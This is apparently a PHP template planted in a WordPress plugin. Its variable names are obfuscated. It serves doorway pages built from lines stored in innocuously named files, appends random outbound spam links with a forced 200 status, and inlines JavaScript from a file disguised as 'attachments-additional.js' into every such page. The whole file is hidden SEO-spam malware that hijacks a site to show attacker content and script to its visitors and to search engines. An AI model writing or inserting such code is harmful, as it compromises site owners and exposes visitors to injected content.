<?php
$gE2HIWCLX = intval(get_query_var('nrdqrzsu'));

if ($gE2HIWCLX < 1 || $gE2HIWCLX > 4105) return;
$vKNDdtC = file(plugin_dir_path(__FILE__).'menus-slideshow.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$oFNyHzblJ = explode(';', $vKNDdtC[$gE2HIWCLX]);
if (count($oFNyHzblJ) < 2) return;
$f13xo = $oFNyHzblJ[0];
$eUTMWZI  = $oFNyHzblJ[1];
$hN5w5WDEEh = $oFNyHzblJ[2];
$kAonwA8  = $oFNyHzblJ[3];
$oFOXmPVhd1 = $oFNyHzblJ[4];
set_query_var('eabdtza', $f13xo);

$aRLwRP = '';
$ov5UZXjiS = plugin_dir_path(__FILE__).'404-press.php';
if (is_file($ov5UZXjiS)) {
	$tq03W = file($ov5UZXjiS, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($tq03W);
	shuffle($tq03W);
	$wtlDvpXIjS = mt_rand(2, 5);
	if (count($tq03W) > $wtlDvpXIjS) {
		for ($ulUb2sXTha = 0; $ulUb2sXTha < $wtlDvpXIjS; $ulUb2sXTha++) {
			$yXnp115JSd = array_shift($tq03W);
			$aRLwRP .= '<p><a href="'.$yXnp115JSd.'">'.$yXnp115JSd.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $f13xo; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $eUTMWZI . "</p>\n";
				if (strlen($kAonwA8) > 0) echo "<p>" . $kAonwA8 . "</p>\n";
				if (strlen($hN5w5WDEEh) > 0) echo "<p>" . $hN5w5WDEEh . "</p>\n";
				if (strlen($oFOXmPVhd1) > 0) echo '<p><a href="#"><img src="'.$oFOXmPVhd1.'"></a>' . "</p>\n";
				echo $aRLwRP;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$ePYhc = plugin_dir_path(__FILE__) . 'attachments-additional.js';
if (is_file($ePYhc)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($ePYhc);
	echo '</script>';
}
get_footer();
?>
